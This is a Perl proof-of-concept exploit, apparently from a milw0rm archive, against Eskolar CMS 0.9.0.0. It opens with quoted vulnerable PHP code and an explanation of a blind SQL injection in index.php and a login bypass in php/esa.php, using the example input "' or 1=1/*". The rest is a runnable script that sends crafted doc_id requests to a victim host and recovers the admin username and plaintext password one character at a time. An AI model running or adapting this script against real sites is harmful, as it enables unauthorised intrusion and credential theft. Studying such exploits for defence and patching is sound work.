#==================================================================================================
#!/usr/bin/perl
use IO::Socket;
#==================================================================================================

#==============================================================================#

#        Jacek Wlodarczyk (j4ck) - jacekwlo[at]gmail[dot]com                 #

#==============================================================================#

#==================================================================================================
#Title:       Eskolar CMS 0.9.0.0 Blind SQL Injection Exploit and bypass admin logon vulnerability
#Application: Eskolar CMS
#Version:     0.9.0.0
#Url:         http://sourceforge.net/projects/eskolar/
#==================================================================================================

#==================================================================================================
#Affected software description:

#Not properly sanitized input can be used to inject crafted SQL queries and cause
#the database server to generate an invalid SQL query. We can use Blind SQL Injection attack
#to determine username and password for CMS and also classical SQL Injection
#to bypass admin logon. Password for CMS is storing in database as clear text!
#There is using addslashes() function to filtration GET variables, but we can prepare
#SQL query without slashes in Blind attack. There is not addslashes() function to filtration
#variables using to log in, so we can use classical SQL Injection to log in as admin.

#Vulnerable files: index.php, php/lib/del.php, php/lib/download_backup.php, php/lib/navig.php,
#php/lib/restore.php, php/lib/set_12.php, php/lib/set_14.php, php/lib/upd_doc.php

#==================================================================================================

#==================================================================================================
#Sample vulnerable code: (Blind attack) (index.php - lines 161-172)

#if (isset ($_GET['gr_1_id'])) {
#	$gr_1_id = (get_magic_quotes_gpc()) ? $_GET['gr_1_id'] : addslashes($_GET['gr_1_id']);
#}
#if (isset ($_GET['gr_2_id'])) {
#	$gr_2_id = (get_magic_quotes_gpc()) ? $_GET['gr_2_id'] : addslashes($_GET['gr_2_id']);
#}
#if (isset ($_GET['gr_3_id'])) {
#	$gr_3_id = (get_magic_quotes_gpc()) ? $_GET['gr_3_id'] : addslashes($_GET['gr_3_id']);
#}
#if (isset ($_GET['doc_id'])) {
#	$doc_id = (get_magic_quotes_gpc()) ? $_GET['doc_id'] : addslashes($_GET['doc_id']);
#}

#...

#index.php - line 202
#$q = "SELECT * FROM ".$prefix."_admin_group_3 WHERE id = ".$gr_3_id." ORDER BY 'sorted' ASC";
#etc.

#...
#==================================================================================================

#==================================================================================================
#Bypass admin logon:

#Vulnerable code: (php/esa.php - lines 27-35)

#$uid = isset ($_POST['uid']) ? $_POST['uid'] : $_SESSION['uid'];
#$pwd = isset ($_POST['pwd']) ? $_POST['pwd'] : $_SESSION['pwd'];
#//$prefix="esa";
#$enter = 0;
#$_SESSION['uid'] = $uid;
#$_SESSION['pwd'] = $pwd;

#mysql_select_db($database_bkb, $bkb);
#$q_a = "SELECT * FROM ".$prefix."_admin_user WHERE `user` = '".$uid."' AND `password` = '".$pwd."'";

## If magic_quotes_gpc = Off attacker can log in as admin using classical SQL Injection attack.
## Eg: USER: j4ck' or 1=1/*
##     PSW:  *blank*

#===================================================================================================


#PoC Exploit:


if ((@ARGV lt 2) or (@ARGV gt 3))
  {
    &usage;
  }


sub usage()
{
  print "\r\n (c) Jacek Wlodarczyk (j4ck)\r\n\r\n";
  print "- Exploit for Eskolar CMS 0.9.0.0\r\n\r\n";
  print "- Usage: $0 <target> <target directory>\r\n";
  print "- <target>              -> Victim's target eg: http://www.victim.com\r\n";
  print "- <target directory>    -> Path to index.php  eg: /eskolar/\r\n";
  print "- Eg: http://127.0.0.1 /esa/\r\n\r\n";
  exit();
}


$HOST        = $ARGV[0];
$DIR         = $ARGV[1];
$prefixDB    = $ARGV[2];


if (@ARGV eq 2)
  {
    $prefixDB    = "esa";
  }



print "\r\nATTACKING : ".$HOST.$DIR."\r\n\r\n";
$HOST =~ s/(http:\/\/)//;


#$positive = "?doc_id=999%20or%201=1--";
#$negative = "?doc_id=999%20or%201=0--";


       @ARR = ("user","password");


print "Connecting ...\r\n";
sleep(1);

TOP:
for ($k=0;$k<=$#ARR;$k++)

  {

    $j=1;
    $i = 32;
    $string='';
    $res='';


    while()
      {
        $l=0;
        for ($i=32;$i<=127;$i++)
          {


            $val  = "?doc_id=99999";
            $val .= "/**/or/**/1=1";
            $val .= "/**/and/**/ascii(substring(";
            $val .= "(select/**/$ARR[$k]/**/from/**/".$prefixDB."_admin_user/**/limit/**/1)";
            $val .= ",$j,1))/**/=/**/$i";


            $data="$DIR$val";

            $req = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$HOST", PeerPort => "80") || die "Error - connection failed!\r\n\r\n";

            print $req "GET $data HTTP/1.1\r\n";
            print $req "Host: $HOST\r\n";
            print $req "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4\r\n";
            print $req "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
            print $req "Accept-Language: en-us;q=0.7,en;q=0.3\r\n";
            print $req "Accept-Encoding: gzip,deflate\r\n";
            print $req "Keep-Alive: 300\r\n";
            print $req "Connection: Keep-Alive\r\n";
            print $req "Cache-Control: no-cache\r\n";
            print $req "Connection: close\r\n\r\n";


            while ($ans = <$req>)
              {
                if ($ans =~ /404/ )
                  {
                    printf "\n\nFile not found.\r\n\r\n";
                    exit;
                  }


                if ($ans =~ /400/ )
                  {
                    printf "\n\nBad request.\r\n\r\n";
                    exit;
                  }


                if ($ans =~ /ORDER BY sorted ASC/)
                  {

                    $string .= chr($i);

                    if (((ord(substr($string,length($string)-1,length($string)-1))-ord(substr($string,length($string)-2,length($string)-2))) %2 eq 0) and (length($string) ge 2))
                      {
                        $res .= chr($i-1);
                        $l=1;
                      }
                    last;
                  }
              }

            if ($l eq 1)
              {
                print "Found: ".chr($i-1)."\r\n";
                sleep(1);
                last;
              }

            if ($i eq 127)
              {

                print "$ARR[$k] found: $res\r\n";
                $ARR[$k] = $res;

                if (($k eq 1) and (($ARR[0] ne '') or ($ARR[1] ne '')))
                  {
                    print "\r\n\r\n\r\n--------------------  Username => $ARR[0]";
                    print  " Password => $ARR[1]  -----------------------\r\n";
                  }

                elsif (($ARR[0] eq '') and ($ARR[1] eq ''))
                {
                  print "Nothing found ...";
                }


                if ($k eq 0)
                  {
                    sleep(1);
                    print "\nTrying Password\r\n";
                    sleep(1);
                  }

                sleep(1);

                next TOP;

              }

            print "\t\t\t\tTrying: ".chr($i)."\r\n";

          }

        $string = '';

        $j++;
      }

  }

#========================================================================================================

# milw0rm.com [2006-07-18]
